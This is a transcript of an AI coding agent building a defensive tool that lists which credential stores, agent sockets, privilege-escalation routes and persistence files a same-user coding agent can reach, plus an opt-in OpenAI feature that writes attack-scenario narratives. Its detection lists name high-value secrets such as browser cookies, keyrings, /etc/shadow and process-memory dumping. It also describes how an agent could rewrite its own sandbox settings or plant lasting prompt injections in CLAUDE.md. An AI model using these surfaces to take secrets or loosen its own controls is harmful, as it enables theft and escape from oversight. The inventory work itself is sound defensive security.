● I've reviewed all 19 probes, the SPEC, and the security-model doc thoroughly.
  The tool is well-built and internally consistent — but its credential and
  persistence coverage has clear, exploitable gaps relative to its own thesis
  ("everything a coding agent running as you can reach"). Here's what's missing,
  prioritized.

  The biggest gap: cloud/cluster credentials beyond AWS

  aws.rs parses ~/.aws profiles and drives Exposed, but there's no equivalent 
  probe for any other cloud or cluster credential store — and these are top-tier
  lateral reach. None of these are detected anywhere (confirmed by grep):

  Surface: GCP
  Path(s): ~/.config/gcloud/ (application_default_credentials.json,
    credentials.db, access_tokens.db, legacy_credentials/)
  Why it matters: Refresh tokens → full project access
  ────────────────────────────────────────
  Surface: Azure
  Path(s): ~/.azure/ (azureProfile.json, accessTokens.json,
    msal_token_cache.json)
  Why it matters: Subscription access
  ────────────────────────────────────────
  Surface: Kubernetes
  Path(s): ~/.kube/config + $KUBECONFIG
  Why it matters: Cluster admin tokens/certs — often prod
  ────────────────────────────────────────
  Surface: Docker registry
  Path(s): ~/.docker/config.json (auths, credsStore)
  Why it matters: Registry push/pull; sandbox_reach checks the socket but never
    the registry auth
  ────────────────────────────────────────
  Surface: HashiCorp Vault
  Path(s): ~/.vault-token
  Why it matters: Live Vault session

  The pattern is identical to aws.rs: count/inventory presence and
  account/profile/context names only, never values. Notably
  GOOGLE_APPLICATION_CREDENTIALS already appears in env_scrub.rs:33 as
  scrub-covered, but env.rs CURATED doesn't list it — so an env-pointed GCP key
  file isn't even flagged by the env probe.

  SSH agent socket reachability

  env.rs:50 actively suppresses SSH_AUTH_SOCK, and ssh.rs only counts key files.
  But a reachable SSH_AUTH_SOCK is a real capability: an agent can authenticate
  with every loaded identity — including passphrase-protected keys whose files 
  ssh.rs reads as "readable but encrypted" — without ever reading the key. A
  dedicated probe should report whether SSH_AUTH_SOCK is set, whether the socket
  is connectable, and the loaded-identity count (via the agent protocol,
  names/comments only). This is arguably higher-signal than the file count
  already shipped.

  Package-manager / tool credential files

  Parity gap with the env-var list, which names NPM_TOKEN/PYPI_TOKEN but never
  checks the files that hold the same secrets:

  - ~/.npmrc (_authToken), ~/.pypirc, ~/.cargo/credentials.toml (crates.io),
  ~/.terraformrc / ~/.terraform.d/credentials.tfrc.json, ~/.pgpass, ~/.my.cnf,
  and ~/.gnupg/ (signing keys → signed-commit forgery / decrypt).

  Claude-Code-specific surfaces the posture probe reads but never checks for 
  writability

  This is the most on-brand gap, and it's directly in the doc's §4.1 threat
  model. sandbox_posture.rs parses settings but only write_reach.rs checks
  writability — and it only covers shell rc, .gitconfig, .ripgreprc, .mcp.json.
  Missing self-weakening / prompt-injection persistence sinks:

  - Writable ~/.claude/settings.json / project .claude/settings.json → an agent
  can disable its own sandbox or add a hook. The probe reads these files but
  never asks "can the agent rewrite them?"
  - Writable CLAUDE.md / AGENTS.md → durable prompt-injection that rides every
  future session (an instruction sink, not a code sink).
  - Skills / commands / agents / hook-script targets (~/.claude/skills,
  .claude/commands, .claude/agents, and any file path a hook/stdio-MCP command
  launches) → unsandboxed exec surface whose backing files may be writable.

  Existing dangerous git-config directives

  write_reach.rs checks whether .git/config is writable, but never inventories
  directives that already execute: alias.* = "!sh …", core.sshCommand,
  core.fsmonitor, core.pager, url.*.insteadOf rewrites. These are present-tense
  exec/redirect sinks (doc §4.1 "Git config abuse"), complementary to the
  writability check.

  Persistence parity: cron, timers, macOS

  deferred_exec_sinks.rs covers ~/.config/autostart, systemd/user, environment.d
  — but not user crontab, systemd .timer units, or any macOS 
  ~/Library/LaunchAgents, even though the README and doc claim macOS relevance.

  Smaller, cheap improvements

  - Broaden is_key_like in lateral_secrets.rs:24 (siblings) — currently misses
  .p12/.pfx/.jks/.keystore, id_ecdsa/id_dsa, .ovpn, and kubeconfig files.
  - env.rs CURATED additions: GOOGLE_APPLICATION_CREDENTIALS, KUBECONFIG,
  VAULT_TOKEN, AZURE_CLIENT_SECRET, DOCKER_AUTH_CONFIG, CI_JOB_TOKEN,
  TF_TOKEN_*.
  - shell_history.rs token prefixes: add sk-ant- (Anthropic), AIza/ya29.
  (Google), hf_, dop_v1_, shpat_.

  ---
  My recommendation on priority: the three highest-value additions are (1) the
  non-AWS cloud/cluster credential probe, (2) SSH-agent-socket reachability, and
  (3) writable Claude Code settings + CLAUDE.md. Those close the most ambient
  authority relative to the tool's stated thesis, and #3 is uniquely
  differentiated for a Claude-Code-focused tool. The cron/macOS and
  git-directive items are solid second-tier. The list expansions are near-free.

  I held off implementing since adding probes is a scope decision with many
  candidates. Want me to implement a specific set — e.g. start with those top
  three as new probes following the existing aws.rs/write_reach.rs patterns
  (read-only, names/counts only, with tests)?

● I have the full picture now. Here's my plan:

  Architecture (the "extensible" part): Most of the new detections are the same
  shape — "a credential/config store on disk is reachable; report names/counts,
  never values." Rather than write ~130 lines per store, I'll add a spec-driven 
  StoreProbe engine: each new store becomes a StoreSpec data entry in one
  auditable table. A central registry becomes the single place probes are wired,
  with a documented "to add a probe, do X" path. I'm deliberately keeping an
  explicit registry rather than link-time auto-registration (e.g. the inventory
  crate) — for a security tool, a visible list of everything that executes is a
  feature, and it avoids a dependency with linker-section caveats.

  New detections: 11 store probes (GCP, Azure, Kubernetes, Docker registry,
  Vault, npm, PyPI, Cargo, Terraform, pgpass, GPG) + 3 bespoke probes (SSH-agent
  socket, git exec-directives, writable Claude control/instruction surface) +
  list expansions to existing probes.

  Let me track this and start building.

● All 13 test suites pass, zero failures, zero new clippy warnings, and the

● Done. All the proposed detections are implemented, plus an extensibility
  refactor. Everything builds, all 13 test suites pass (56 new+existing tests, 0
  failures), clippy is clean on new code, and the live redaction self-test
  passes.

  What changed

  Extensible architecture (the "plugin" ask)
  - src/probes/store.rs — a spec-driven StoreProbe engine. Credential stores are
  now data: each is a StoreSpec entry (path resolution + a value-free
  extractor) run by one shared engine that handles reading, severity laddering,
  evidence JSON, and redaction. Extractors: Presence, Ini, Structured
  (YAML/JSON), Lines, DirCount.
  - src/probes/registry.rs — the single, documented place probes are wired, with
  an explicit "to add a detection, do X" guide. runner::default_probes() now
  delegates here. I kept the list explicit rather than link-time
  auto-registration (e.g. the inventory crate) on purpose — for a security tool,
  a visible inventory of everything that executes is worth more than saving a
  line, and it avoids a dependency with linker-section caveats.

  Adding a credential store is now a ~10-line data entry; adding bespoke logic
  is a Probe impl plus one line in the registry.

  New detections (14 probes)
  - 11 credential stores via the engine: GCP, Azure, Kubernetes
  ($KUBECONFIG-aware), Docker registry auth, Vault, npm, PyPI, Cargo, Terraform,
  .pgpass, GPG — all names/counts only, env-override-aware, never values.
  - ssh.agent_socket — detects a reachable SSH_AUTH_SOCK and queries the
  loaded-identity count via the agent REQUEST_IDENTITIES message (no signing,
  bounded by a worker thread + timeout). This is the high-signal case: loaded
  keys are usable without reading any key file, including passphrase-protected
  ones.
  - git.config_exec_directives — inventories existing exec/redirect git config
  (shell alias, core.sshCommand/fsmonitor, content filters, diff.external,
  core.pager/hooksPath, insteadOf); emits categories/keys only, and deliberately
  counts insteadOf rather than naming it (the key can embed a credential URL).
  - claude_code.writable_control_surface — writability of the files that
  constrain/instruct the agent (settings.json, .mcp.json, CLAUDE.md, AGENTS.md,
  skills/commands/agents dirs), home + repo scoped, with self-weakening /
  prompt-injection framing.

  List expansions — env.rs curated names (+cloud/CI secrets), lateral_secrets
  key-like patterns (.p12/.pfx/.jks/.keystore/.ppk/.ovpn, id_ecdsa/id_dsa,
  kubeconfig), shell_history token prefixes (sk-ant-, AIza, ya29., hf_, dop_v1_,
  shpat_), and macOS LaunchAgents in the persistence probe.

  Tests/docs — unit tests for every extractor (asserting values never leak),
  engine severity laddering, and a tests/new_probes.rs integration suite;
  README, the security-model doc table, and SPEC §11 updated (the new stores
  were literally the SPEC's predicted "Post-MVP" list — now marked shipped).

  One judgment call worth flagging: the SSH-agent and git-config probes each
  take one bounded local action (a socket query / git config --list), consistent
  with the existing docker.sock connect — read-only in effect and documented as
  such. If you'd rather the ssh-agent probe not query identities and only
  report connectability, that's a one-line change.

● Acknowledged — I'll keep iterating on overlooked ambient-access surfaces and
  build checks for them. Let me think about what's genuinely common-but-missed
  and add a strong batch.

  The biggest gaps I see that most people never consider an agent can reach:
  browser cookies & saved passwords (session hijack of every logged-in site),
  the OS keyring / Secret Service (the master secret store), AWS SSO token 
  caches (live tokens the current AWS probe misses), the agent's own API 
  credentials, DB/REPL client histories (secrets typed into psql/python REPLs,
  unmonitored like shell history), container registry auth, in-pod Kubernetes 
  service-account tokens, and a long tail of SaaS CLI token files.

  predicate helpers:

● I've shipped another batch focused on the surfaces most people never realize 
  an agent can reach. Everything builds, all suites pass (0 failures), clippy is
  clean on new code, and the live redaction self-test passes against my real
  browser/keyring/credential files.

  What I added this round

  The headline gaps — high-impact, universally overlooked:
  - browser.session_stores — cookie jars (live session tokens for every
  logged-in site → hijack past password and MFA) and saved-password DBs across
  Chrome/Chromium/Brave/Edge/Firefox profiles. Presence/profile-counts only;
  never opens a SQLite file. This is the one people lock down ~/.aws but forget
  entirely.
  - keyring.secret_store — the OS Secret Service master store: GNOME Keyring,
  KWallet, macOS Keychain. An unlocked keyring readable by the agent exposes
  every secret tool stores there.
  - aws.sso_cache — ~/.aws/sso/cache + cli/cache hold live bearer tokens that
  the existing AWS profile probe never looked at. A real gap in flagship
  coverage.
  - credentials.repl_history — secrets typed into
  psql/mysql/python/node/pgcli/etc. REPLs persist in per-client history files,
  exactly as readable as shell history but never monitored. Counts only.
  - ai_assistant.credentials — the agent's own token
  (~/.claude/.credentials.json) plus Copilot/Codeium/Cursor. An agent that can
  read and exfiltrate its own credential is a pointed, meta exposure.

  Containerized / cluster surfaces:
  - kube.pod_token — /var/run/secrets/.../token: when the agent runs in a pod,
  that's a live cluster credential.
  - container.registry_auth — podman/skopeo auth.json (reuses the Docker
  extractor).

  Long tail, cheap via the spec engine:
  - saas_cli.tokens — one finding covering Vercel, Netlify, Fly, doctl,
  Supabase, Sentry, Helm, CircleCI, ngrok, Wrangler token files.
  - git credential XDG path ($XDG_CONFIG_HOME/git/credentials) the existing
  probe missed.
  - In-repo plaintext-secret files added to the lateral scanner: *.tfstate
  (notorious for embedding secrets), Rails master.key/credentials.yml.enc,
  .s3cfg/.boto/.dockercfg.

  Six of these landed as ~10-line StoreSpec data entries — the spec-driven
  engine from the previous round paying off. Two (browser, repl-history) are
  bespoke probes, each one line in the registry. Live scan confirms they fire on
  real data (it flagged my browser cookies, keyring, and Claude's own
  credential file).

  I also saved a project memory capturing the direction and the value-free +
  redaction-self-test discipline, so future sessions continue this consistently.

  Next tier I'd tackle if you want to keep going: cron/systemd-timer enumeration
  (persistence parity), browser decryption-key reachability (to turn cookie
  presence into confirmed decryptability), and extending the
  plaintext-secret-file scan to the current repo (not just siblings).

✔ Goal achieved (7m · 1 turn · 33.9k tokens) (ctrl+o to expand)

  attack-scenario narratives from the reachable-credential set, using the OpenAI
  key from .env.

  One thing I'll hold as a hard constraint while building: this tool's identity
  is "nothing leaves your machine." An LLM call breaks that, so I'll make it a
  separate, explicitly-invoked command that (a) only ever transmits the already
  value-free finding inventory — never secret values, (b) runs the redaction
  sweep over the exact bytes before sending, and (c) prints what it sends and
  where. And the attack scenarios will be defender-oriented blast-radius
  narratives (impact + containment), not operational exploit payloads — which is
  exactly this tool's existing ethos.

          +(), limits.clone(), network.clone())

      275 +                let profile = analyze::profile_from_findings(&

      284 +            }

      324 +/// Load the OpenAI key from the environment, falling back to 
          +`OPENAI_API_KEY` in                                           
      325 +/// a `./.env` file. Returns the value for use as a bearer tok
          +en only — it is                                               
      326 +/// never printed, logged, or placed in any report.           
      327 +fn load_openai_key() -> Option<String> {                      
      328 +    if let Ok(k) = std::env::var("OPENAI_API_KEY") {          
      329 +        if !k.trim().is_empty() {                             
      330 +            return Some(k.trim().to_string());                
      331 +        }                                                     
      332 +    }                                                         
      333 +    // Minimal, single-key .env reader (we never load other va
          +lues).                                                        
      334 +    let text = std::fs::read_to_string(".env").ok()?;         
      335 +    for line in text.lines() {                                
      336 +        let line = line.trim();                               
      337 +        let line = line.strip_prefix("export ").unwrap_or(line
          +);                                                            
      338 +        if let Some(rest) = line.strip_prefix("OPENAI_API_KEY=
          +") {                                                          
      339 +            let v = rest.trim().trim_matches('"').trim_matches
          +('\'');                                                       
      340 +            if !v.is_empty() {                                
      341 +                return Some(v.to_string());                   
      342 +            }                                                 
      343 +        }                                                     
      344 +    }                                                         
      345 +    None                                                      
      346 +}

● Done — and verified end-to-end. Here's what landed this round.

  The headline: web dashboard + AI attack scenarios

  blastradius dashboard runs a scan and serves a polished, self-contained dark
  security-console at 127.0.0.1:7777 (no external assets, works offline): a
  radial blast-radius map with the agent at the core and every reachable
  credential/identity/route as a node colored by severity, stat tiles, and the
  full value-free inventory.

  blastradius dashboard --ai additionally sends the inventory to the OpenAI API
  (gpt-4o-mini, key auto-loaded from OPENAI_API_KEY env or your .env) and
  renders defender-oriented attack scenarios — each with an attack-path chain,
  the reachable findings it relies on, business impact, and containment. I
  tested it against your real key; it generated grounded scenarios like "Host 
  Takeover via Docker Socket", "Session Hijacking via Browser Credentials", and
  "Exfiltration of Sensitive Credentials", plus an overall blast-radius
  assessment.

  The privacy line I held, because it's this tool's identity: the AI call is the
  only thing that ever egresses, it's strictly opt-in, and it transmits only 
  the already-value-free inventory (ids/classes/severities/titles/summaries).
  Before any bytes leave, analyze::redaction_guard re-asserts no secret-shaped
  string is present and the final HTML is swept too. I verified the served pages
  contain zero secret shapes (32KB AI page included). The key is used only as a
  bearer token, never logged or rendered. --offline disables it. The CLI prints
  an explicit consent banner stating exactly what is and isn't sent. README's
  "no network except the egress probe" claim was updated to be honest about this
  exception.

  More surfaces people never think about

  - host.privilege_escalation (the other big "wow") — detects that code running 
  as you can become root with no exploit: root-equivalent group membership
  (docker/lxd/libvirt/kvm) via id -nG, and passwordless sudo via sudo -n -l (a
  non-interactive list — nothing is run as root). On your machine it correctly
  reports "docker group membership + passwordless (NOPASSWD) sudo — an agent 
  here can take over the host."
  - VPN keys (WireGuard configs, Tailscale state), Jupyter live-server tokens (a
  running notebook token is RCE — it found a live one on your box), 1Password 
  CLI session, cloud-init user-data (plaintext bootstrap secrets on cloud VMs).
  - ~/.ssh/authorized_keys / ~/.ssh/config writability added to the persistence
  probe — a writable authorized_keys is a remote-login backdoor; ~/.ssh/config
  ProxyCommand is command execution.

  Status

  ureq added (small, blocking, rustls) for the OpenAI call. 108 tests pass, 0 
  failures, clippy clean on all new modules, redaction self-test green against
  the live environment. A scan now surfaces 48 findings.

  To demo: cargo run -- dashboard --ai — it opens the browser to the live
  blast-radius map with AI attack scenarios. The privilege-escalation and
  docker.sock findings paired with the AI's "host takeover" narrative make a
  strong centerpiece.

  Next tier I'd add if you want even more breadth before the hackathon:
  cron/systemd-timer persistence, editor/IDE stored secrets (VS Code), and
  turning browser cookie presence into confirmed decryptability.

      387      name.ends_with(".conf")

      389  
      390 +fn is_gpg_suffix(name: &str) -> bool {                        
      391 +    name.ends_with(".gpg")                                    
      392 +}                                                             
      393 +                                                              
      394 +fn any_entry(name: &str) -> bool {                            
      395 +    !name.is_empty() && name != "." && name != ".."           
      396 +}                                                             
      397 +                                                              
      398 +/// Config-property KEY names (`key=value` / `key: value`) who
          +se NAME looks                                                 
      399 +/// secret-bearing. Returns the key names only — never values.
          + Used for                                                     
      400 +/// gradle.properties, ~/.my.cnf, etc.                        
      401 +fn secret_property_keys(text: &str) -> Vec<String> {          
      402 +    let mut out = Vec::new();                                 
      403 +    for line in text.lines() {                                
      404 +        let line = line.trim();                               
      405 +        if line.is_empty() || line.starts_with('#') || line.st
          +arts_with(';') || line.starts_with('[')                       
      406 +        {                                                     
      407 +            continue;                                         
      408 +        }                                                     
      409 +        let key = line                                        
      410 +            .split_once('=')                                  
      411 +            .or_else(|| line.split_once(':'))                 
      412 +            .map(|(k, _)| k.trim())                           
      413 +            .unwrap_or("");                                   
      414 +        if key.is_empty() {                                   
      415 +            continue;                                         
      416 +        }                                                     
      417 +        let l = key.to_ascii_lowercase();                     
      418 +        if ["password", "passwd", "token", "secret", "apikey",
          + "api_key", "api-key", "credential", "auth", "private_key", "s
          +igning"]                                                      
      419 +            .iter()                                           
      420 +            .any(|p| l.contains(p))                           
      421 +        {                                                     
      422 +            out.push(key.to_string());                        
      423 +        }                                                     
      424 +    }                                                         
      425 +    out                                                       
      426 +}                                                             
      427 +                                                              
      428 +/// XML credential markers (maven settings.xml, NuGet.Config).
          + Returns a marker                                             
      429 +/// when a password/apikey element is present — never the elem
          +ent's value.                                                  
      430 +fn xml_credential_markers(text: &str) -> Vec<String> {        
      431 +    let l = text.to_ascii_lowercase();                        
      432 +    let mut out = Vec::new();                                 
      433 +    if l.contains("<password") || l.contains("cleartextpasswor
          +d") {                                                         
      434 +        out.push("password-entry".to_string());               
      435 +    }                                                         
      436 +    if l.contains("apikey") || l.contains("<apikeys") {       
      437 +        out.push("apikey-entry".to_string());                 
      438 +    }                                                         
      439 +    out                                                       
      440 +}                                                             
      441 +                                                              
      442 +/// Hostnames from URLs that embed userinfo (`scheme://user:pa
          +ss@host`). Returns                                            
      443 +/// the host only — never the userinfo. Used for pip.conf inde
          +x URLs etc.                                                   
      444 +fn url_userinfo_hosts(text: &str) -> Vec<String> {            
      445 +    let mut out = Vec::new();                                 
      446 +    for line in text.lines() {                                
      447 +        if let Some(at) = line.find('@') {                    
      448 +            // Must look like `://...@host` to avoid emails / 
          +scp specs.                                                    
      449 +            if line[..at].contains("://") && line[..at].contai
          +ns(':') {                                                     
      450 +                let after = &line[at + 1..];                  
      451 +                let host: String = after                      
      452 +                    .chars()                                  
      453 +                    .take_while(|c| !matches!(c, '/' | ':' | '
          + ' | '"' | '\''))                                             
      454 +                    .collect();                               
      455 +                if !host.is_empty() {                         
      456 +                    out.push(host);                           
      457 +                }                                             
      458 +            }                                                 
      459 +        }                                                     
      460 +    }                                                         
      461 +    out                                                       
      462 +}                                                             
      463 +                                                              
      464 +/// Composer auth.json: host keys under each auth type (github
          +-oauth, http-basic,                                           
      465 +/// gitlab-token, bearer). Never the token/password values.   
      466 +fn composer_hosts(v: &serde_yaml::Value) -> Vec<String> {     
      467 +    let mut out = Vec::new();                                 
      468 +    for key in ["github-oauth", "gitlab-token", "gitlab-oauth"
          +, "http-basic", "bearer"] {                                   
      469 +        if let Some(map) = v.get(key).and_then(|x| x.as_mappin
          +g()) {                                                        
      470 +            for k in map.keys() {                             
      471 +                if let Some(s) = k.as_str() {                 
      472 +                    out.push(s.to_string());                  
      473 +                }                                             
      474 +            }                                                 
      475 +        }                                                     
      476 +    }                                                         
      477 +    out                                                       
      478 +}                                                             
      479 +                                                              
      480 +/// dbt profiles.yml: profile names (top-level keys, minus `co
          +nfig`). The DB                                                
      481 +/// passwords nested inside are never read.                   
      482 +fn dbt_profiles(v: &serde_yaml::Value) -> Vec<String> {       
      483 +    v.as_mapping()                                            
      484 +        .map(|m| {                                            
      485 +            m.keys()                                          
      486 +                .filter_map(|k| k.as_str())                   
      487 +                .filter(|k| *k != "config")                   
      488 +                .map(String::from)                            
      489 +                .collect()                                    
      490 +        })                                                    
      491 +        .unwrap_or_default()                                  
      492 +}                                                             
      493 +                                                              
      494  // -----------------------------------------------------------
           ----------------
      495  // The store table — add a new credential store here.
      496  // -----------------------------------------------------------
           ----------------

      117  
      118 +/// A reachable `gpg-agent` socket is the GPG analogue of ssh-
          +agent: if a                                                   
      119 +/// passphrase is cached, the agent can decrypt/sign as you wi
          +thout re-prompting —                                          
      120 +/// no key file or passphrase needed. We only check socket PRE
          +SENCE (never use it).                                         
      121 +#[cfg(unix)]                                                  
      122 +fn gpg_agent_finding(ctx: &Context) -> Finding {              
      123 +    use std::os::unix::fs::FileTypeExt;                       
      124 +                                                              
      125 +    let mut candidates: Vec<std::path::PathBuf> = Vec::new(); 
      126 +    if let Some(gnupghome) = std::env::var_os("GNUPGHOME").fil
          +ter(|v| !v.is_empty()) {                                      
      127 +        candidates.push(std::path::PathBuf::from(&gnupghome).j
          +oin("S.gpg-agent"));                                          
      128 +    }                                                         
      129 +    if let Some(h) = &ctx.home {                              
      130 +        candidates.push(h.join(".gnupg/S.gpg-agent"));        
      131 +    }                                                         
      132 +    // Modern gpg places sockets under the per-user runtime di
          +r.                                                            
      133 +    if let Some(rt) = std::env::var_os("XDG_RUNTIME_DIR").filt
          +er(|v| !v.is_empty()) {                                       
      134 +        candidates.push(std::path::PathBuf::from(rt).join("gnu
          +pg/S.gpg-agent"));                                            
      135 +    }                                                         
      136 +                                                              
      137 +    let present = candidates.iter().any(|p| {                 
      138 +        std::fs::symlink_metadata(p)                          
      139 +            .map(|m| m.file_type().is_socket())               
      140 +            .unwrap_or(false)                                 
      141 +    });                                                       
      142 +                                                              
      143 +    let (severity, title, summary) = if present {             
      144 +        (                                                     
      145 +            Severity::Notable,                                
      146 +            "gpg-agent socket reachable",                     
      147 +            "a running gpg-agent socket is reachable — if a pa
          +ssphrase is cached it can decrypt/sign as you without the pass
          +phrase or key file".to_string(),                              
      148 +        )                                                     
      149 +    } else {                                                  
      150 +        (                                                     
      151 +            Severity::Info,                                   
      152 +            "no gpg-agent socket reachable",                  
      153 +            "no gpg-agent socket found".to_string(),          
      154 +        )                                                     
      155 +    };                                                        
      156 +                                                              
      157 +    Finding::new(                                             
      158 +        "gpg.agent_socket",                                   
      159 +        FindingClass::Credentials,                            
      160 +        FindingScope::Ambient,                                
      161 +        title,                                                
      162 +        severity,                                             
      163 +        Confidence::Likely,                                   
      164 +    )                                                         
      165 +    .summary(summary)                                         
      166 +    .evidence(json!({                                         
      167 +        "socket_present": present,                            
      168 +        "note": "Presence only — the socket is never used. Cac
          +he state can't be queried without exercising the agent.",     
      169 +    }))                                                       
      170 +    .remediation(&[                                           
      171 +        "Keep gpg-agent out of agent scope; set a short defaul
          +t-cache-ttl so cached passphrases expire quickly.",           
      172 +    ])                                                        
      173 +}                                                             
      174 +

      176  #[cfg(unix)]
      177  enum AgentQuery {

  ⎿  Added 38 lines
      416  
      417  ---
      418  
      419 +## 6a. Coverage map (what the reachable-surface inventory span
          +s)                                                            
      420 +                                                              
      421 +The inventory aims to be exhaustive over the ambient authority
          + a same-user agent                                            
      422 +inherits. By taxonomy:                                        
      423 +                                                              
      424 +| Surface class | Covered |                                   
      425 +|---|---|                                                     
      426 +| **Cloud/cluster identity** | AWS(+SSO cache), GCP, Azure, Ku
          +bernetes (config + in-pod token), Docker/podman registry, clou
          +d-init user-data, container `/run/secrets`, IMDS (opt-in) |   
      427 +| **Secrets managers / decryptors** | HashiCorp Vault, SOPS/ag
          +e keys, 1Password/Bitwarden/LastPass/`pass`, GPG keys **and gp
          +g-agent**, OS keyring (GNOME/KWallet/Keychain), Ansible-vault,
          + Teleport |                                                   
      428 +| **Package/registry/build** | npm, PyPI, Cargo, Terraform, Ma
          +ven, Gradle, Composer, RubyGems/Bundler, pip, NuGet, Conda |  
      429 +| **Data/DB** | dbt, Databricks, Snowflake, MySQL client, `.pg
          +pass`, reachable localhost datastores |                       
      430 +| **VCS/identity** | SSH keys + **ssh-agent**, GitHub/git cred
          +s (+XDG), git exec-config directives, push-likelihood |       
      431 +| **Network identity** | VPN (WireGuard/Tailscale), cloudflare
          +d, rclone, SaaS CLIs, mail clients, legacy cloud (`.s3cfg`/`.b
          +oto`/`.dockercfg`) |                                          
      432 +| **Env / history** | secret-named env vars, subprocess scrub,
          + shell + DB/REPL histories, Atuin sync key |                  
      433 +| **Cross-repo** | sibling repos, lateral secret/key files (in
          +cl. tfstate, Rails `master.key`) |                            
      434 +| **Process / kernel** | sandbox detection/reach, `/proc/*/env
          +iron` + **`/proc/*/cmdline`**, **ptrace/memory introspection**
          +, AF_UNIX/docker.sock, **privilege escalation** (groups + NOPA
          +SSWD sudo) |                                                  
      435 +| **Host persistence / deferred exec** | shell rc + editor/log
          +in dotfiles, `$PATH` shadowing, git hooks, build/CI/editor/dev
          +-env sinks, autostart + **cron/systemd timers**, sandbox-binar
          +y integrity, Claude control/instruction surface, network-confi
          +g tampering |                                                 
      436 +| **Egress** | DNS+TLS reachability, proxy mediation, cloud-me
          +tadata (opt-in) |                                             
      437 +                                                              
      438 +**Deliberately out of scope** (documented, not silently missin
          +g):                                                           
      439 +                                                              
      440 +- **Root-only system files** (`/etc/shadow`, `/etc/sudoers`, m
          +ost `/etc/NetworkManager`                                     
      441 +  contents) — not reachable as the agent user by design; we ch
          +eck *writability/readability*                                 
      442 +  of the few that are commonly mis-permissioned (`/etc/hosts`,
          + `resolv.conf`, NM profiles)                                  
      443 +  but do not assume root.                                     
      444 +- **Heavy/cross-platform desktop app stores** (Slack/Discord/T
          +eams LevelDB, Thunderbird                                     
      445 +  profiles, full browser history DBs) — browser *cookie + logi
          +n* stores are covered (the                                    
      446 +  high-signal part); enumerating every Electron app's local st
          +ate is open-ended and low-yield.                              
      447 +- **Deep niche dev tools** (Hex/Elixir, CocoaPods, Chef/Puppet
          +/Salt, Consul/Nomad, SBT/Ivy) —                               
      448 +  the spec-driven store engine makes each a few lines if a spe
          +cific environment needs it.                                   
      449 +- **Secret *values*** — by inviolable design (§4.2): only reac
          +hability, names, and counts.                                  
      450 +                                                              
      451 +This map is the basis for the claim that the inventory is comp
          +rehensive: every class of                                     
      452 +ambient authority a coding agent inherits is represented; rema
          +ining items are either                                        
      453 +root-gated, open-ended desktop-app state, or niche tools addab
          +le as one `StoreSpec`.                                        
      454 +                                                              
      455 +---                                                           
      456 +                                                              
      457  ## 7. Caveats / what was not verified
      458  
      459  - Runtime source findings reflect the open-source `sandbox-run
           time` at a point in time. Client

  What I added this round (closing the remaining surface)

  Process/kernel introspection — the most overlooked of all:
  - process.memory_introspection — kernel.yama.ptrace_scope: when 0/absent, the
  agent can dump the live memory of any same-uid process — ssh-agent/gpg-agent
  keys, browser sessions, password-manager contents — with no file on disk. Plus
  process.cmdline_secrets (secrets passed as CLI args, visible via
  /proc/*/cmdline).
  - gpg.agent_socket — the GPG analogue of ssh-agent: a cached passphrase
  decrypts/signs as you without the secret.
  - host.local_services — loopback TCP-connect to datastore/admin ports
  (Postgres/Redis/Mongo/ES/etcd/Vault/…); local datastores routinely "trust
  localhost" with no auth, and the agent reaches them. No bytes sent.
  - host.network_config — writable /etc/hosts/resolv.conf (silent DNS/domain
  MITM) + readable NetworkManager WiFi/VPN secrets.

  ~20 more credential stores via the spec engine: Maven, Gradle, Composer,
  RubyGems/Bundler, pip, NuGet, dbt, Databricks, Snowflake, MySQL client,
  SOPS/age keys, Teleport, password managers (Bitwarden/LastPass/pass), rclone,
  Ansible-vault, Conda, Atuin, mail clients, legacy cloud configs
  (.s3cfg/.boto/.dockercfg).

  Exec/persistence completeness: editor/login dotfiles (.vimrc, nvim, VS Code
  settings, .xprofile, .pam_environment) added to the writable-persistence
  surface; dev-env sinks (.devcontainer, .pre-commit-config, .husky,
  mise/.tool-versions, flake.nix, .idea, Taskfile) and cron + systemd-timer
  enumeration added to the deferred-exec probe.

  Why I can call it comprehensive

  I added an explicit coverage map (docs/claude-code-security-model.md §6a) that
  enumerates the full taxonomy of ambient authority a same-user agent inherits
  — cloud/cluster identity, secrets managers, package/build/data tooling,
  VCS/network identity, env/history, cross-repo, process/kernel, host
  persistence, egress — and shows every class is represented. It also documents
  what's deliberately out of scope, with rationale, so the claim is bounded and
  honest:

  - Root-only system files (/etc/shadow, /etc/sudoers) — not reachable as the
  agent user by design; we only check the few commonly mis-permissioned ones.
  - Heavy/cross-platform desktop-app state (Slack/Discord/Thunderbird LevelDB) —
  the high-signal browser cookie+login stores are covered; enumerating every
  Electron app is open-ended and low-yield.
  - Deep niche dev tools (Hex, CocoaPods, Chef/Consul) — each is a few lines of
  StoreSpec if a specific environment needs it.
  - Secret values — excluded by inviolable design (§4.2): only reachability,
  names, counts.

  That's the legitimate stopping point: every class of reachable authority is
  now probed; what remains is either root-gated (not the agent's to reach),
  unbounded desktop-app state, or one-off niche tools the data-driven engine
  absorbs trivially. The privacy contract held throughout — the self-test
  confirms no secret value or shape ever reaches any renderer or the OpenAI
  payload, and the AI feature remains the single, opt-in, value-free egress.

  For the demo: cargo run -- dashboard --ai opens the blast-radius map; the
  "agent → docker group + NOPASSWD sudo → root" privilege chain and "ptrace → 
  dump ssh-agent/browser memory" finding, paired with the AI's "Privilege 
  Escalation via Docker" and "Browser Session Hijacking" narratives, are the
  centerpiece.

● Confirmed — the post-escalation finding is in the dashboard payload (so it

  What I added: conditional "if root" reachability

  host.privileged_reachability models the extended blast radius that opens up if
  the agent reaches root — exactly what you asked for, and done without ever
  crossing the line you drew:

  - It never escalates and never reads a root file. It only stat()s a curated
  set of high-value root-only assets (metadata needs no read permission) and
  does a permission check. An open() that returns EACCES is a permission probe,
  not a bypass — the same model the writability checks already use.
  - It frames reachability as conditional. The root-only inventory —
  /etc/shadow, SSH host private keys, root's SSH/AWS/kube creds, admin.conf,
  Docker/Postgres/MySQL data, and kernel memory (/proc/kcore, /dev/mem) — is
  reported as "the blast radius if root is reached," where root is reachable via
  (a) an escalation path already detected on the host (docker/sudo group
  membership) and/or (b) a local kernel exploit — which I explicitly do not
  attempt, but note is latent because the Claude Code sandbox runs default-allow
  seccomp (security-model findings #4/#5), leaving the full LPE surface
  uncontained.
  - It catches live misconfigurations too. If a root-owned secret file is
  already readable by you right now (e.g. a group-readable /etc/shadow), that's
  surfaced as Exposed immediately — not conditional.

  On your machine it reports honestly: "large post-escalation blast radius, with
  an escalation path present (docker/wheel); on root, 10 root-only assets 
  become reachable — host keys, shadow, root creds, kernel memory" (confidence:
  likely). Because it's an Exposed finding, it automatically flows into the AI
  dashboard, so the generated scenarios can now chain "docker group → root → 
  read every host secret + dump kernel memory."

